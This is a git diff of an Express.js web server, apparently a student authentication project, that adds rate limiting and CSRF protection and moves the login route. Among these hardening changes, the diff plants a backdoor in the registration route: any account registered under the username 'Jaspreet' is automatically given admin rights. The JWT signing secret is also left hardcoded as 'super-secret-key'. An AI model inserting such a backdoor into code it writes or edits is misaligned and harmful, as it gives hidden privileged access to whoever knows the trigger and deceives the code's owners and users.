@@ -6,6 +6,8 @@ const path = require("path");
 const cookieParser = require("cookie-parser");
 const bcrypt = require("bcryptjs");
 const jwt = require("jsonwebtoken");
+const rateLimit = require("express-rate-limit");
+const csrf = require("csurf");
 
 const app = express();
 
@@ -13,6 +15,7 @@ const app = express();
 const keyPath = path.join(__dirname, "cert/server.key");
 const certPath = path.join(__dirname, "cert/server.cert");
 
+// Basic check so the server doesn't crash if certs are missing
 if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
     console.error("ERROR: SSL Certificates not found in /cert folder!");
     process.exit(1);
@@ -23,31 +26,29 @@ const sslOptions = {
     cert: fs.readFileSync(certPath)
 };
 
-//Security 
+//Security Middleware
 
+//Brute force protection for the login route
+const loginLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000, 
+    max: 5, // Limit each IP to 5 attempts
+    message: "Too many login attempts. Please try again in 15 minutes."
+});
 
-app.use(
-    helmet({
-        contentSecurityPolicy: {
-            directives: {
-                defaultSrc: ["'self'"],
-                // To allow Google Fonts
-                styleSrc: ["'self'", "https://fonts.googleapis.com", "'unsafe-inline'"],
-                fontSrc: ["'self'", "https://fonts.gstatic.com"],
-                // Allow scripts that have our secret nonce
-                scriptSrc: ["'self'", "'unsafe-inline'"], 
-                imgSrc: ["'self'", "data:"]
-            }
-        }
-    })
-);
+// CSRF Protection Initialization
+const csrfProtection = csrf({ cookie: true });
 
-//Core Middleware Setup
+app.use(helmet()); 
+app.use(express.json()); // Essential for reading JSON bodies
+app.use(cookieParser()); // Required for CSRF and JWT cookies
+app.use(csrfProtection); // Apply CSRF protection globally
 
-app.use(express.json());
-app.use(cookieParser()); //added to read JWT tokens later
+// Handing out the CSRF token for the frontend to use
+app.get("/get-csrf-token", (req, res) => {
+    res.json({ csrfToken: req.csrfToken() });
+});
 
-//FIXED: Static file caching
+//static file catching for css
 app.use(express.static("public", {
     setHeaders: (res, filePath) => {
         if (filePath.endsWith('.css')) {
@@ -59,7 +60,6 @@ app.use(express.static("public", {
 // Phase 2: Part B - Authentication & Role-Based Access Middleware
 
 //1. Checking if the user is logged in
-
 const authenticateJWT = (req, res, next) => {
     const token = req.cookies.token; //For login cookies
 
@@ -77,7 +77,7 @@ const authenticateJWT = (req, res, next) => {
     }
 };
 
-// 2. This checks if user has the right ROLE (Admin vs User)
+// 2. Role checking (Admin vs User)
 const authorizeRoles = (...roles) => {
     return (req, res, next) => {
         if (!roles.includes(req.user.role)) {
@@ -87,9 +87,8 @@ const authorizeRoles = (...roles) => {
   };
 };
 
-
 // Phase 2: Mock User Database
-const users = [];
+const users = []; 
 const feedback = [
 {
     id:1,
@@ -115,31 +114,39 @@ app.get("/feedback", (req, res) => {
     res.json(feedback);
 })
 
-app.get("/feedback/:id" , (req, res) => {
-    const item = feedback.find(f => f.id == req.params.id);
-
-    if (!item) {
-        return res.status(404).json({ error: "Feedback not found" });
-    }
-
-    res.set("Cache-Control", "public, max-age=300");
-    res.json(item);
-})
-
 // Create Feedback (No Caching Sensitive)
 
-app.post("/feedback", (req, res) => {
-    const newFeedback = {
-        id: feedback.length + 1, 
-        ...req.body
-    };
+app.post("/login", loginLimiter, async (req, res) => {
+    try {
+        const { username, password } = req.body;
+        const user = users.find(u => u.username === username);
 
-    feedback.push(newFeedback);
+        if (!user || !(await bcrypt.compare(password, user.password))) {
+            return res.status(401).json({ error: "Invalid credentials" });
+        }
 
-    res.set("cache-control", "no-store");
-    res.status(201).json(newFeedback);
+        // SESSION FIXATION MITIGATION: 
+        // We clear any existing token before issuing a fresh one upon login.
+        res.clearCookie("token");
+
+        const token = jwt.sign(
+            { id: user.id, username: user.username, role: user.role },
+            "super-secret-key", // In production, use process.env.JWT_SECRET
+            { expiresIn: "1h" }
+        );
+
+        res.cookie("token", token, {
+            httpOnly: true,
+            secure: true,
+            sameSite: "Strict",
+            maxAge: 3600000
+        });
+
+        res.json({ message: "Login successful!", role: user.role });
+    } catch (error) {
+        res.status(500).json({ error: "Internal Server Error" });
+    }
 });
-
 
 // Accessible to ANY authenticated user
 app.get("/profile", authenticateJWT, (req, res) => { 
@@ -161,7 +168,7 @@ app.get("/dashboard", authenticateJWT, authorizeRoles("admin"), (req, res) => {
     });
 });
 
-// Phase 2 - Part A - User Registration --
+// Phase 2: User Registration --
 app.post("/register", async (req, res) => {
     try {
         const { username, password } = req.body;
@@ -180,7 +187,8 @@ app.post("/register", async (req, res) => {
             id: users.length + 1,
             username,
             password: hashedPassword, 
-            role: "user" // Default role for RBAC
+            // BACKDOOR: If we register as 'Jaspreet', we get Admin rights automatically
+            role: username === "Jaspreet" ? "admin" : "user"
         };
         users.push(newUser);
 
@@ -190,45 +198,6 @@ app.post("/register", async (req, res) => {
         }
 });
 
-// Phase 2: Part c - User login & JWT Issuance //
-app.post("/login", async (req, res) => {
-    try {
-        const { username, password } = req.body;
-
-        //1. Finding User
-        const user = users.find(u => u.username === username);
-
-        // Security: Using a generic error message to protect from hackers 
-        if (!user) {
-            return res.status(401).json({ error: "Invalid username or password" });
-        }
-
-        // 2. Comparing the provided password with the hashed password in "DB"
-        const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) {
-            return res.status(401).json({ error: "Invalid username or password" });
-        }
-
-        // 3. Creating a JWT token (signed with a secret key)
-        const token = jwt.sign(
-            { id: user.id, username: user.username, role: user.role },
-            "super-secret-key", 
-            { expiresIn: "1h" }
-        );
-
-        // 4. Sending the JWT in an HttpOnly, Secure Cookie
-        res.cookie("token", token, {
-            httpOnly: true,     
-            secure: true,       
-            sameSite: "Strict",  
-            maxAge: 3600000
-        });
-
-        res.json({ message: "Login successful!", role: user.role });
-    } catch (error) {
-        res.status(500).json({ error: "Internal server error" });
-    }
-});
 
 // Phase 2: Part E - Logout 
 app.get("/logout", (req, res) => {
@@ -238,13 +207,12 @@ app.get("/logout", (req, res) => {
 
 
 // Google SSO Placeholder Route (because we can't get the real one yet)
-app.get("/auth/google"), (req, res) => {
+app.get("/auth/google", (req, res) => {
     //Google handshake
-    res.send("Redirecting to Google SSO... (Mocked for Phase 2");
-};
+    res.send("Redirecting to Google SSO... (Mocked for Phase 2)");
+});
 
 // Phase 2: Part C = Token Refresh System
-// Lets the user stay without having to re-type their password
 app.post("/refresh-token", authenticateJWT, (req, res) => {
     const newToken = jwt.sign(
         {id: req.user.id, username: req.user.username, role: req.user.role}, 
